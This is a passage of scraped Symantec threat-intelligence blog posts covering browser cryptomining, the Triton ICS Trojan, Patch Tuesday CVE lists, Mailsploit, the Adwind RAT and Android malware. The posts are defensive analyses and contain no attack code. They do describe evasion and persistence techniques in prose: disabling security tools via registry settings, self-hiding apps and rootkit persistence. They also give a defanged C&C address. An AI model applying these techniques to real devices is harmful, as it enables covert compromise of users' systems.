revenue. Once again, this project didn’t last long, as soon after it started the New Jersey Division of Consumer Affairs stepped in to investigate the fledgling company on charges of unlawful access to \"a person’s computer processing power.\" This resulted ina long drawn out case which was finally settled in 2015. The case for browser-based mining wasn’t looking good. The growing problem of profitability was made even worse by the increasing use of ASIC miners. The advent of ASIC miners dragged bitcoin mining out of the realm of home users and into an industrial age dominated by the massive mining farms that we are more familiar with today. After the demise of Tidbit, the idea of browser-based JavaScript cryptocurrency mining largely died away once again. Despite these setbacks, key lessons were learned. The point of a service like Tidbit was never about single servers or high-end computers doing solo mining. The true power of this service came from scaling up and pooling the potentially massive combined mining power of masses of users with average hardware visiting a website. Higher website traffic means higher returns and sooner or later, somebody was bound to figure out a better way to get browser mining to work on end users' computers more efficiently. Fast forward to September 2017, the cryptocurrency landscape compared with 2013 had changed drastically.In April 2013, the cryptocurrency market only had a handful of coins and the total market capitalization was just $1.5 billion. The market for cryptocurrency was extremely limited and illiquid, meaning that even if you got some, it was not easy to turn it back into fiat currency for spending. Contrast that withSeptember 2017 when the market capitalization stood at an incredible $166billion spread over more than a thousand different coins. Together with the diversity of coins to choose from in 2017, there was also now a diversity of coin reward mechanisms. Some, like Bitcoin, can still only be mined via a proof-of-work (PoW) process using dedicated power-hungry ASIC hardware—though there have been attempts to change this, with the various hard forks such as Bitcoin Gold (BTG) and Bitcoin Diamond (BCD), to bring in GPU mining. Other cryptocurrencies like Monero, Ethereum (ETH), Ethereum Classic (ETC), and Dash (DASH) can be mined using retail-grade GPU hardware found in many home computers. There are also some that are more suited to CPU mining; these include Monero and Verium Reserve (VRM). The trading environment is massively different too; it’s now much easier to move between fiat currencies and cryptocurrencies, making the latter more useful and valuable. It's against this backdrop that Coinhive released its browser-mining scripts designed to mine Monero, effectively bringing the idea of browser-based mining back from the dead. Coinhive is marketed as an alternative to browser ad revenue. The motivation behind this is simple: users pay for the content indirectly by coin mining when they visit the site and website owners don't have to bother users with sites laden with ads, trackers, and all the associated paraphernalia being downloaded to the browser. Users hopefully then get a cleaner, faster, and potentially less risky website (remember malvertising?) to use, and everybody is happy. What could go wrong? Soon after the release of the Coinhive service, the hash rate for the service started to climb, and quickly too. Hash rate is the number of hashes calculated by the combined power of the mining pool and is measured in the number of hashes per second—usually in units of millions (MH/s). Hashing is the process of carrying out cryptographic hash calculations which are used to help process transactions. Miners who participate in a mining pool get paid a share of income generated by the pool. According to a blog by Coinhive, the hash rate for their pool climbed from 0 MH/s to 3 MH/s in a couple of days before reaching 13.5 MH/s in the space of a week. To put that into perspective, the total network hash rate (the total amount of mining power for all computers mining) for Monero stood at around 260 MH/s on September 20, 2017. The Coinhive pool reached just over five percent of that total which is quite an achievement in such a short time. Monero can be mined with CPUs and GPUs, but the Coinhive browser-based mining service only works for CPU mining which is a limitation that substantially reduces potential returns. To maximize revenue, the script is best placed on high-traffic websites and \"sticky\" websites (where users stay on the same page for longer). According to one early adopter,the revenue generated by his particular site was far lower than the revenue generated from ads. In fairness to Coinhive, it recommends being transparent with site visitors and that website owners notify users of the mining that will be taking place and, better still, offer users a way to opt in. Unfortunately, despite Coinhive’s best intentions, unscrupulous operators quickly latched on to the idea of secret mining in the hope that users will not notice. The first high-profile site to start using Coinhive mining was The Pirate Bay torrent website. The Pirate Bay has had a checkered history and, being a highly trafficked site (global ranking #161 with 290 million visitors in the last six months), has been looking for alternative ways to monetize its considerable traffic. Its initial attempts at browser mining were quickly spotted by users and they were not too happy about it. At least in the case of The Pirate Bay, this was a case of the site's owners making a decision to use Coinhive. The Pirate Bay's initial attempts at browser mining were quickly spotted by users and they were not too happy about it. The Pirate Bay was soon followed by another high-profile site—this time Coinhive's miner wasfound on two of Showtime's websites. One of the Showtime sites affected was its content streaming site which has high traffic and user sessions are lengthy as visitors stay on the site while content is streaming. Showtime is a premium-based service so it would seem strange that users are made to pay twice for content. The scripts were promptly removed after they were discovered, suggesting that they were planted there maliciously. Reports of many other sites using the Coinhive mining scripts soon followed. Over the Thanksgiving holiday in the U.S.,the Coinhive miner was also found in a LiveHelpNow widgetwhich is used by many websites around the world to offer in-browser support chat sessions. The apparent cause of this was the compromise of one of the CDN servers used by LiveHelpNow to serve up its widget. As with Showtime, LiveHelpNow is already a legitimate revenue-generating business and there's no obvious reason as to why it would risk user confidence to earn a few extra bucks from users. So the most likely scenario is that the server was compromised either by an outsider, or even an insider. Browser mining is cropping up in many other different places too: There are many reasons why browser-based mining is back with a vengeance. Unlike in previous failed attempts, recent developments in the cryptocurrency and threat landscapes have made this a much more viable activity. Let's have a look at some of these factors in more detail: Privacy is important if you want to mine coins maliciously, in order to ensure others cannot easily follow the money trail back to you. Monero, which came to the market in 2014, can offer a high level of transaction privacy. Unlike with most other cryptocurrencies that use public transparent blockchains where transaction addresses can be easily viewed by anyone, Monero does things differently. By default, everything is private, including the amount in a transaction, who sent it, and who received it. There is an option with whichwallet owners can selectively reveal some information via what's called a view key, but this is not a feature that cyber criminals are likely to want to use. As mentioned earlier, Coinhive provides a very neat and easy-to-use package for people to get involved in Monero mining. All you have to do is add a few lines of script to your website code. You don't have to make website visitors download and install executable files. The mining process can start quickly and quietly in the browser without anybody noticing, unless insufficient throttling is used, in which case the CPU load may max out during the users' session which would be an easy tell-tale for end users to spot. CPU load may max out during the users' session which would be an easy tell-tale for end users to spot. Even with the price of Monero reaching over $300 recently, given the current network hash power of the network at around 300 MH/s, profitable mining is a game of scale and requires a careful eye on costs. With browser-based mining, the cost of mining is borne mostly by the website visitors through hardware wear and tear as well as energy costs. Scale is achieved by using high-traffic sites with sticky content. Coinhive currently pays 0.000104 XMR ($0.025) for every million hashes. Take for example a user of a PC with a mid-range Intel i7-7700K CPU which is capable of pushing out around 300 H/s. The user would have to spend 3,333 seconds on the site, or roughly 55 minutes, in order to achieve a million hashes. However, if you can get 3,333 users to spend approximately one second each on the site it would achieve a similar result. Even under optimal conditions, the amount of hashes produced in each instance will be small, but when it comes to distributed computing power, it's all about scale and every little bit adds up. As we noted earlier, the value of mining rewards are not great, at least not initially. To get a better understanding, we need to look at the profitability of this activity over the longer term and take in the macroeconomic picture to get a true sense of the reward. The value of cryptocurrencies like Monero is going up dramatically. So far in 2017, the price has gone from $13 to over $300. Under these circumstances where the price of Monero can go up substantially in dollar terms over a relatively short time, mining Monero can become an attractive proposition. A small amount of Monero mined today could potentially be worth a great deal more in a matter of months (conversely it could also drop significantly depending on the health of the overall cryptocurrency economy). Mirroring the rising interest and price of cryptocurrency, we have also seen a big jump in our detections of both file- and browser-based cryptocurrency mining activity in recent months. Malicious cryptocurrency mining isn't just confined to desktop computers and servers. Always-connected mobile devices are also a growing target. We have even seen growth in coin mining on mobile phones in recent years. In 2016, we discovered 26 different Android apps that were mining cryptocurrencies. So far in 2017 we have found 35, which is around a 34 percent increase. Modern mobile phones have processors that can beas powerful as low- to mid-range desktop computerswhich help to make mobile mining more viable. But cryptocurrency mining is always an energy-intensive activity so the biggest problem facing mobile mining is of course battery drain as battery technology has not progressed as fast as processing power. Mobile mining will inevitably be noticed by the heat generated and the fast-draining battery, not to mention any performance impacts that it may also have on the device. If we consider the cryptocurrency market as whole, we can see that just as the total value of cryptocurrencies increased manifold during the year, interest in malicious mining activity, both browser- and executable-based as indicated by detections of malicious mining activity, increased in tandem with it. As interest increases, more participants, both as miners and tool makers, join the fray. Coinhive, while being the best known at this time, doesn't have the market to itself. Similar projects like Crypto Loot are cropping up, and other browser mining projects like JSEcoin have been in beta since August 2017 and are trying to generate growth in this activity. Symantec has observed a significant jump in all cryptocurrency mining activity in recent months as evidenced in our increasing detection rate (See Figures 4 and 5). Despite the genuine aspirations of most browser mining projects to offer a real and potentially better alternative to traditional web revenue generation methods, the sad reality is, it can and is being misused. Increasing user awareness and detection by security vendors will trigger a new arms race between cyber criminals and defenders. Recent innovations in the malicious use of browser-based mining scripts, such as the\"pop-under\" techniquewhere browser mining takes place in a hidden browser window, are a sign of this in action. We can expect to see adoption of a wide range of traditional malware propagation and evasion techniques to help spread and prolong mining activity in order to maximize profit. For as long as the current enabling factors are in place making it favorable for mining, we can expect to see interest in browser mining to be sustained or even increase in the short to medium term. Symantec is keeping a watchful eye on the growing trend of browser mining. We are making adjustments as necessary to prevent unwanted cryptocurrency miners from stealing your computing resources to enrich others. Website owners should watch for injection of the browser-mining scripts into their website source code. Our network solutions can help you spot this in the network traffic as your server communicates with visitors. In addition, file system scans can also show up any files where the browser-based miner code has been injected, enabling you to identify and clean up the content. Symantec helps prevent others from stealing your computing resources by protecting various stages of the attack chain: All mining software, whether it is file- or browser-based, must be able to connect to either the cryptocurrency network or a mining pool to exchange data, in other words its proof-of-work. Without this connection, it cannot get the data it needs to generate hashes, rendering it useless. We can also block the mining scripts from being downloaded in the first instance. Our network protection operates on our endpoint solutions as well as our gateway and cloud touch points; all these solutions help build a solid defense against unwanted mining activity. Here are some of the network protection signatures geared towards detection of browser-based mining: Our endpoint solutions, including those for mobile devices, can detect and block all types of mining activity whether they are file-based or in-browser. These solutions can prevent mining software from installing or running in the first instance. Browser-based mining scripts are detected asPUA.JScoinminer. Hon is a member of Symantec’s Security Technology and Response team who are focused on providing round-the-clock protection against current and future cyber threats. He’s interested in looking at new technologies and their implications on security and society. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/browser-mining-cryptocurrency"
  },
  {
    "title": "triton malware ics",
    "content": "Symantec is aware of a new Trojan which targets industrial control systems (ICS) and has the potential to cause severe disruption at any targeted organization. Triton (Trojan.Trisis), is designed to communicate with a specific type of ICS, namely safety instrumented systems (SIS) and deploy alternative logic to these devices, meaning they may not function correctly. Triton has reportedly been used against at least one organization in the Middle East. Triton, which has been in existence since at least August 2017, works by infecting a Windows computer that is expected to be connected to a SIS device.The malware then injects code modifying the behavior of the SIS device. However, at present the intended effect is unclear and investigation is still underway. Safety instrumented systems are a type of industrial control system designed to monitor the performance of critical systems and take remedial action should an unsafe condition be detected. This could include overly high temperatures or pressure readings in industrial systems. The SIS is designed to detect such conditions and initiate action that will put the affected systems into a safe state. Attacks on SIS devices could potentially cause disruption at a targeted organization and, at worst, facilitate sabotage. By interfering with the operation of an SIS, an attacker could cause it to malfunction and shutdown operations at a plant. A worst case scenario is an attack where an SIS malfunctions, does not detect an unsafe event and therefore fails to prevent an industrial accident. The latter would be more difficult to accomplish since the attacker would need to ensure an unsafe condition occurs while the SIS is malfunctioning. While there have been a small number previous cases of malware designed to attack ICS, Triton is the first to attack SIS devices. The first and most notable example of ICS malware was Stuxnet (W32.Stuxnet) which wasdesigned to attack programmable logic controllers (PLCs)being used in the Iranian uranium enrichment program. The Dragonfly cyber espionage grouphas also been known to target ICSand previously compromised a number of ICS equipment providers, infecting their software with the Oldrea Trojan (Backdoor.Oldrea) (aka Havex). More recently, the Disakil disk-wiping malware (Trojan.Disakil), which wasused in attacks against the Ukrainian energy sector in late 2016, contained a component designed to target SCADA (supervisory control and data acquisition) ICS systems. The malware attempted to stop and delete a service used by software designed to communicate with legacy SCADA systems. Triton appears to be designed to be used in a highly targeted fashion, meaning it is possible the attackers may be focused on one specific target or a small number of targets. Nevertheless, users of SIS devices are advised to review operational security and follow the manufacturer’s best practices, such as ensuring safety systems are deployed on isolated networks and no unauthorized persons have access to SIS devices. Symantec is continuing to investigate this threat. Symantec has the following protection in place to protect customers against these attacks: Symantec IOTCritical System Protectionalso blocks this threat. Symantec's Security Response organization develops and deploys new security content to Symantec customers. Our team of global threat analysts operate 24x7 to track developments on the threat landscape and protect Symantec customers. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/triton-malware-ics"
  },
  {
    "title": "microsoft patch tuesday december",
    "content": "This month, Microsoft has patched 32 vulnerabilities, 19 of which are rated Critical. As always, customers are advised to follow these security best practices: Microsoft's summary of the December 2017 releases can be found here:https://portal.msrc.microsoft.com/en-us/security-guidance This month's update covers vulnerabilities in: The following is a breakdown of the issues being addressed this month: Cumulative Security Update for Microsoft Browsers Microsoft Edge Memory Corruption Vulnerability(CVE-2017-11888)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11889)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11893)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11886)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11890)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11894)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11895)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11901)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11903)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11914)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11905)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11907)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11908)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11909)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11910)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11911)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11912)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11918)MS Rating: Critical Scripting Engine Information Disclosure Vulnerability(CVE-2017-11919)MS Rating: Important Scripting Engine Memory Corruption Vulnerability(CVE-2017-11930)MS Rating: Important Scripting Engine Information Disclosure Vulnerability(CVE-2017-11887)MS Rating: Important Scripting Engine Information Disclosure Vulnerability(CVE-2017-11906)MS Rating: Important Scripting Engine Memory Corruption Vulnerability(CVE-2017-11913)MS Rating: Important Scripting Engine Memory Corruption Vulnerability(CVE-2017-11916)MS Rating: Important Cumulative Security Update for Microsoft Office Microsoft Exchange Spoofing Vulnerability(CVE-2017-11932)MS Rating: Important Microsoft PowerPoint Information Disclosure Vulnerability(CVE-2017-11934)MS Rating: Important Microsoft Excel Remote Code Execution Vulnerability(CVE-2017-11935)MS Rating: Important Microsoft SharePoint Elevation of Privilege Vulnerability(CVE-2017-11936)MS Rating: Important Microsoft Office Information Disclosure Vulnerability(CVE-2017-11939)MS Rating: Important Cumulative Security Update for Microsoft Windows Windows RRAS Service Remote Code Execution Vulnerability(CVE-2017-11885)MS Rating: Important Microsoft Windows Security Bypass Vulnerability(CVE-2017-11899)MS Rating: Important Microsoft Windows Information Disclosure Vulnerability(CVE-2017-11927)MS Rating: Important More information is available on Symantec's freeSecurity Centerportal and to our customers through the DeepSight Threat Management System. Ratheesh is a member of Symantec's Cyber Security Services organization which provides round-the-clock monitoring and protection services against cyber attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/microsoft-patch-tuesday-december"
  },
  {
    "title": "mailsploit email exploit spoofing",
    "content": "A newly discovered exploitaffects more than 30 widely used email applications, could allow attackers to spoof sender addressesand, in some cases, carry out cross site scripting (XSS) and code injection attacks. “Mailsploit” is the collective name for several vulnerabilities affecting email clients, including Microsoft Outlook 2016, Mail for Windows 10, Apple Mail (including macOS, iOS, and watchOS versions), Mozilla Thunderbird, and Yahoo Mail for iOS and Android. Mailsploit was discovered by security researcher Sabri Haddouche, who published his findings on Tuesday December 5. Haddouche said Mailsploit had been found and confirmed in 33 different products. If successfully exploited, Mailsploit allows an attacker to falsify the address an email appears to come from. It takes advantage of a flawed implementation of RFC-1342, a 25-year-old recommendation for displaying non-ASCII text in mail headers, and allows an attacker to create headers that insert various bytes into the “from” line in an attempt to mask the true sender. This could allow an attacker to increase their chances of successfully delivering a malicious email to a target since the recipient is more likely to open it if it appears to come from a trusted source. Spoofing email headers was once a fairly trivial thing to do, but the practice was curtailed by the rollout of new safeguards such as Domain-based Message Authentication, Reporting and Conformance (DMARC). Mailsploit could allow an attacker to create a spoofed email that will bypass DMARC. Additionally, in the case of some affected email clients, Mailsploit also permits code injection and cross XSS attacks. These include Spark, a mail client for MacOS and iOS, MacOS clients Polymail and Airmail, and mobile apps TypeApp and AquaMail. To date, Mailsploit has been patched in eight products and triaged on 12 more products. Two vendors—Mozilla and Opera—said they won’t fix the bug because they consider it to be a server-side problem. Apple Mail, Mail for Windows, and Outlook 2016 are all listed as triaged. The bug has been fixed in Yahoo Mail for iOS and Android. A full list of affected products and mitigation status isavailable here. Symantec Email Security.cloud and Symantec Messaging Gateway (SMG) message filtering are not affected by any of the vulnerabilities reported atwww.mailsploit.com.  For general message handling and sender authentication, we do not attempt to decode the local part of the “From” header’s email address. Symantec products are also not susceptible to the XSS/Code Injection portion of the vulnerabilities. Symantec has the following protection in place to protect customers against these attacks: Symantec's Security Response organization develops and deploys new security content to Symantec customers. Our team of global threat analysts operate 24x7 to track developments on the threat landscape and protect Symantec customers. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/mailsploit-email-exploit-spoofing"
  },
  {
    "title": "surge adwind distribution emails",
    "content": "In August 2017, we began to see a surge of emails that were tied to the Adwind remote access Trojan (RAT). This increased activity led to a peak in October 2017, when we observed a large spike in the number of emails—totaling over 1.5 million—all attempting to deliver several variants of Adwind. In November, Symantec blocked over 1.3 million malicious emails related to this threat, this represents a small dip from October but the activity trend is still definitely upwards. Adwind (Backdoor.Adwind) is a cross-platform, multifunctional RAT also known as AlienSpy, Frutas, Unrecom, Sockrat, JSocket, and jRAT. It was first discovered in 2013 and can be used for logging keystrokes, using the webcam, stealing information, downloading potentially malicious files, as well as a host of other nasty activities. This high-volume campaign kicked off just in time for the holiday/shopping season, and the timing could be designed to give attackers more time to use any stolen credentials, as victims may let their guard down because they are more relaxed and engaged with other festive activities during this time. The emails spreading Adwind come with JAR or ZIP file attachments. There was a surge in the number of malicious JAR files detected by Symantec, which peaked in October but actually began in August. The increase in malicious JAR detections corresponds with the recent Adwind campaign. The number of malicious JARs jumped from just over 840,000 in July to almost 1,272,000 in August. October saw 1.55 million, and November saw over 1.3 million detected. The email surge that began in August is now well established, with the average volume now well above one million emails a month. The Adwind-spreading emails in this recent campaign are made to look like they originate from various service providers from industry sectors such as finance, telecoms, software, and logistics. The emails come with subject lines containing keywords such as “Account statement”, “payment”, and “PURCHASE ORDER”. In some instances the email used (Figure.2) is made to look like it came from a well-known logistics firm. The email looks very convincing and could fool the recipient into thinking it is legitimate, however the email attachment tells a different story. The file is a fake shipping invoice made to look like a PDF file but is actually a JAR file containing the Adwind malware. Other convincing emails appear to come from financial institutions, and some contain two attachments in case someone suspects that the JAR file may be malicious. The Adwind RAT has been around for quite some time but, in an effort to remain undetected, new variants contain very few identifiable strings and use a convoluted scheme involving layer upon layer of obfuscated function calls and classes wrapped inside numerous JAR files. The wrapper file used in this campaign has multiple packages and classes with nested function calls within these multiple classes. The packages contain AES encrypted binary files with different extensions, such as .dll, .bin, and .so, to disguise themselves. All three variants shown in Figure.3 are different in terms of obfuscation but the functionality remains the same. Once executed, the JAR files drop a payload JAR file with a random name and extension. The payload JAR is dropped in a randomly named directory and executed. The threat then runs VBS scripts in order to fingerprint the compromised computer. It also uses the Windows Management Instrumentation (WMI) interface to get details of any installed firewall or security products. The threat then sets registry entries to disable System Restore and set Image File Execution Options for many security products and reversing tools to svchost.exe so that the tools cannot start. It also starts ending processes related to monitoring tools. The threat also connects to its command and control (C&C) server (we observed Adwind connecting with 174[.]127[.]99[.]211 but similar IP address ranges have also been used). The payload JAR is similar to previous versions of Adwind and can be decompiled and reverse engineered using Bytecode Viewer or Java Decompiler and freely available Adwind decryptors. The important files here are those that provide further information on the threat’s configuration: The configuration file points to yet more files specified by the SERVER_PATH, PASSWORD_CRYPTED, and PRIVATE_PASSWORD keys. These keys represents the following attributes: We can use these additional files to isolate the core Adwind RAT tool and decompile it to check the core functionalities. Figure.6 is what we eventually find in the core of Adwind. Looking even deeper into the JAR file, we can see operating system specific implementations (Adwind can work on macOS, Windows, and Linux), and utility classes containing code to execute other files, open shells, and carry out other activities. The resources directory of decrypted.jar contains a set of files that are used to decrypt the contents of config.json. This file contains configuration details (Figure.7) with information on network, path, user, and VMware, among other things. After all the layers of obfuscation are peeled back, what we are left with is Adwind. And Adwind is really a cross-platform malware that can monitor user activity, take screenshots, log keystrokes, record video and audio, and much more. This latest spam campaign spreading yet another variant of the RAT shows that the criminals behind it are constantly changing their tactics to evade detection. However, we are keeping a close eye on Adwind and are adjusting our protection when necessary to keep our customers safe. In the meantime, follow these simple steps to help keep you safe from cyber attacks: Symantec has the following protection in place to protect against the malware mentioned in this blog: Symantec.Cloud has advanced heuristics to detect the type of email used to spread Adwind. Rohit works for the Symantec .Cloud Security team in Symantec's Security Technology and Response (STAR) division. His main areas of interest include reverse engineering, detection logic, and researching new technologies. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/surge-adwind-distribution-emails"
  },
  {
    "title": "latest intel november 2017",
    "content": "Some of the key takeaways fromNovember’s Latest Intelligence, and the threat landscape in general, include increases in spam and phishing rates surrounding key shopping dates, new Android malware, and new research published regarding an attack group. The spam rate increased in November, up 0.6 percentage points from October, following back-to-back months where the rate declined. At 55.5 percent, this is the highest spam rate seen since March 2015. The month of November tends to come with elevated spam rates, having had the highest rate for 2016 and second-highest in 2015. Given how major shopping events in November, such as Black Friday, Cyber Monday, andSingles Day, tend to lead to an increase in email spam, these increases likely come as little surprise. In fact, over the Black Friday to Cyber Monday weekend,the Necurs botnet appears to have sent out a massive volume of spam. The particular campaign appears to be an attempt to compromise the email recipients’ computers with ransomware. The phishing rate also increased in November, where 1 in every 2,560 emails was a phishing attempt. This is the first monthly increase in the rate seen since it reached a 12-month high back in July of this year. One particular scam seen in the lead up to Black Fridayinvolved SMS and messaging apps, where the messages appear to come from legitimate companies. However, rather than legitimate offers, these messages attempt to steal personal information from the unsuspecting recipient. There were three new Android malware threats seen in November. Tying again into the holiday shopping period, two of these threats—Android.DoublehiddenandAndroid.Fakeyouwon—display advertisements and present fake offers, respectively. The third threat,Android.Rootnik.B, installs a rootkit on the compromised device. The email malware rate declined slightly in November, dropping from 1 in 355 emails to 1 in 505. This is the lowest rate seen since April, 2017 and declines were seen across all industry sectors and organization sizes. In November, Symantec identifiedan attack group targeting specific organizations in South America and Southeast Asia. Dubbed Sowbug, the group has been observed stealing documents from the organizations that it manages to break into, most of which appear to be foreign policy and diplomatic targets. This is just a snapshot of the news for the month. Check out theLatest Intelligencefor the big picture of the threat landscape with more charts, tables, and analysis. Ben works for Symantec’s Security Response team, where he dives deep into the threat data, looking at long-term trends, and surfacing occasionally to submit blogs, whitepapers, graphics, and video content. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/latest-intel-november-2017"
  },
  {
    "title": "doublehidden android malware google play",
    "content": "We have uncovered a new Android Trojan that uses several techniques to hide itself on devices, and remain in the Google Play Store. The malicious app collects device information and displays advertisements. However the functionality and behavior of this app could be easily extended to a wide range of other malicious purposes. The malware (Android.Doublehidden) is localized in the Persian language. Its name translates to ‘Photograph by Fiery’and it has a package name of com.aseee.apptec.treeapp. The pattern of availability of this malicious app on Google Play suggests the author is attempting to remain under the radar. During October and November 2017, the app has been updated five times, alternating between a working legitimate photo editing app, and this self-hiding malicious non-app. As far as we can tell, the app developer ‘i.r.r developer’ publishes several other apps which are legitimate. The app presents itself as a photo editing app, but immediately dupes the user and hides itself on installation. On launch, the app asks the user for Device Administrator permissions—awell-used approachfor malware to gain a strong foothold on the device. In the subsequent user interface (UI) screen, the app displays a message which roughly translates as: “Unfortunately, this app does not work on your phone. After exiting, the application will be deleted.” Although the app closes, the malicious functionality is already in place. The app hides itself on the device using the following techniques: The app calls setComponentEnableSetting(). Once the app launches, it disappears from the app launcher (its icon no longer appears on the home screen). The app leverages its position on the victim’s device to collect data and advertising revenue. The app collects user information to send to the malware authors. Google Cloud Messaging is used to push configuration information, including when to collect data and where to send it. The malware may collect the following information: If the user gave the malicious application the Device Administrator permission, it will be more difficult to remove. The malware also requests and displays advertisements on the device including suggestions for additional applications by using the OneSignal notification network. If the user gave the malicious application the Device Administrator permission, it will be more difficult to remove, as the user will have to disable ‘Device Administrator’ for the app in the app settings (and remember, this entry is a blank row) to actually uninstall it. Symantec and Norton products detect this malware as: Stay protected from mobile malware by taking these precautions: Martin is a member of Symantec’s Security Technology and Response team who are focused on providing round-the-clock protection against current and future cyber threats. Shaun is a member of Symantec’s Security Technology and Response team where he is focused on security research, and innovation on mobile platforms. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/doublehidden-android-malware-google-play"
  },
  {
    "title": "android malware porn apps chinese",
    "content": "We recently discovered a malicious toolkit (detected asAndroid.Rootnik.B) masquerading as pornographic apps in the thousands, which are primarily targeted at Chinese-speaking users. This toolkit has a broad range of capabilities, including: The apps find their way onto devices via app-centric websites, forums, and torrent sites. These can also spread over popular social messaging networks. This malware hides its primary malicious payload in a fake .tiff image in the resources of the application. The payload downloads other malicious components from a set of helper web servers. The malware sets immutable flags (atechnique laid out in a previous blog) to protect the files from being deleted by a savvy user or an antivirus application. The threat also attempts to replacedebuggerd, a key service that enables it to survive cleaning attempts by antivirus applications, or even more aggressive cleaning measures such as a factory reset. The malware decrypts and dynamically loads the hidden payload (detected asAndroid.Reputation.1). It decrypts the following command and control (C&C) URLs and queries them to get root-relevant configurations: The following is a sample response that tells the malware where to download the rootkits, when to start a root attempt, how many retry attempts to make if the attempt fails, and the metadata for the rootkit itself: After gaining root privileges, the malware selects a good candidate process (such as a system process or an app-store process) into which it can inject malicious code. The injected code launches a UNIX domain server socket, and listens for commands to trigger methods. Any malicious client entity (an app on the device) can now command the infected process to carry out malicious activities on its behalf, including sending premium-rate messages. The malware also silently downloads and installs a known malicious app namedister59.apk(detected asAndroid.Reputation.3) from the following URL: It can download and dynamically load other payloads from the following URLs without the user’s consent: Moreover, it subscribes to premium services and sends premium text messages. It requests ads and pushes other malicious apps. All devices with Android API level 8 (2.2) or greater are affected. Even if some devices with higher platform versions cannot be rooted, the malware still sends premium-rate messages. In this case, the malware falls back to premium-rate scamming, as it cannot inject or install malware. Furthermore, the malware code is highly modularized, which means it can be easily repackaged into any other popular apps. In addition, the malware is protected by a private packer, asoutlined in a previous post. The malicious code is obfuscated and the key strings are encrypted, thwarting base-level forms of static analysis and detection. Symantec recommends mobile users observe the following security best practices: Symantec and Norton products detect the malware as well as related threats discussed in this blog as the following: Martin is a member of Symantec’s Security Technology and Response team who are focused on providing round-the-clock protection against current and future cyber threats. Shaun is a member of Symantec’s Security Technology and Response team where he is focused on security research, and innovation on mobile platforms. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/android-malware-porn-apps-chinese"
  },
  {
    "title": "ms patch tuesday november 2017",
    "content": "Hello, welcome to this month's blog on the Microsoft patch release. This month the vendor has patched 53 vulnerabilities, 19 of which are rated Critical. As always, customers are advised to follow these security best practices: Microsoft's summary of the November 2017 releases can be found here:https://portal.msrc.microsoft.com/en-us/security-guidance This month's update covers vulnerabilities in: The following is a breakdown of the issues being addressed this month: Cumulative Security Update for Microsoft Browsers Scripting Engine Memory Corruption Vulnerability(CVE-2017-11858)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11861)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11862)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11836)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11837)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11838)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11839)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11840)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11841)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11843)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11866)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11846)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11869)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11870)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11871)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2017-11873)MS Rating: Critical Microsoft Edge Memory Corruption Vulnerability(CVE-2017-11845)MS Rating: Critical Internet Explorer Memory Corruption Vulnerability(CVE-2017-11855)MS Rating: Critical Internet Explorer Memory Corruption Vulnerability(CVE-2017-11856)MS Rating: Critical Microsoft Browser Memory Corruption Vulnerability(CVE-2017-11827)MS Rating: Important Microsoft Edge information disclosure Vulnerability(CVE-2017-11803)MS Rating: Important Microsoft Edge information disclosure Vulnerability(CVE-2017-11833)MS Rating: Important Microsoft Edge information disclosure Vulnerability(CVE-2017-11844)MS Rating: Important Microsoft Edge security bypass Vulnerability(CVE-2017-11863)MS Rating: Important Microsoft Edge security bypass Vulnerability(CVE-2017-11872)MS Rating: Important Microsoft Edge security bypass Vulnerability(CVE-2017-11874)MS Rating: Important Scripting Engine information disclosure Vulnerability(CVE-2017-11791)MS Rating: Important Scripting Engine information disclosure Vulnerability(CVE-2017-11834)MS Rating: Important Internet Explorer information disclosure Vulnerability(CVE-2017-11848)MS Rating: Moderate Cumulative Security Update for Microsoft Office Microsoft Word Memory Corruption Vulnerability(CVE-2017-11854)MS Rating: Important Microsoft Excel security bypass Vulnerability(CVE-2017-11877)MS Rating: Important Microsoft Excel Memory Corruption Vulnerability(CVE-2017-11878)MS Rating: Important 